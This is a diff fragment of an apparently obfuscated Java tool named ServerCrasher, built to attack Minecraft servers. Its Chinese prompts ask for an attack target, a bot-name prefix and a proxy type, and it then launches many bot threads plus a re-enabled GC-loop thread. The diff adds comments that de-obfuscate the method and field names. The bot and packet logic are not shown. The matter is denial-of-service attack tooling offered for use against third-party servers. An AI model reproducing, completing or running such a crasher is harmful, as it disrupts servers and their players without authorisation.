@@ -28,12 +28,14 @@ public class IIIIlllllI { // Class: ServerCrasher
         System.out.println("崩服器即将启动,在那之前你需要填写一些信息");
         System.out.print("攻击的目标: ");
         String target = "";
-        if (aaaaawa.hasNextLine()){
+        if (aaaaawa.hasNextLine()){ // scanner.hasNextLine() 下同
             target= aaaaawa.nextLine();
         }
         System.out.println("正在解析地址");
-        String host;
+        String host; // 这边懒得混淆了
         int port=25565;
+
+        // 这一整段都是那个抽了风的地址解析
         String[] temp = target.split(":");
         if (temp.length==2){
             host=temp[0];
@@ -51,8 +53,8 @@ public class IIIIlllllI { // Class: ServerCrasher
             }
         }
         System.out.println("解析完成:"+host+":"+port);
-        llllllllllII.lllIlIll =host;
-        llllllllllII.IllIlIl =port;
+        llllllllllII.lllIlIll =host; // Configure.host = host;
+        llllllllllII.IllIlIl =port; // Configure.port = port;
         System.out.println("你希望机器人的名字以什么开头?");
         System.out.print("留空以随机: ");
         String prefix="";
@@ -100,17 +102,20 @@ public class IIIIlllllI { // Class: ServerCrasher
                 ttttt= aaaaawa.nextLine();
             }
             if (!ttttt.isEmpty()){
-                llllllllllII.IIlllIL =ProxyInfo.Type.valueOf(ttttt.toUpperCase());
+                llllllllllII.IIlllIL =ProxyInfo.Type.valueOf(ttttt.toUpperCase()); // 我不知道这样写会不会出事
+                // 反正我没给这个东西用过除了SOCKS4以外的代理
             }
         }
         System.out.println("准备启动...");
-        this.awawa();
+        this.awawa(); // this.run()
     }
 
-    public void awawa(){
+    public void awawa(){ // run()
         for (int i = 0; i< llllllllllII.an114514; i++){
             new Thread(new IIIIlllIl()).start();
         }
-        // new Thread(new IllIll()).start();
+        new Thread(new IllIll()).start();
+        // 这个就是我在群里发的那个gc循环的线程
+        // 当然后面发现有没有其实没啥不同
     }
 }
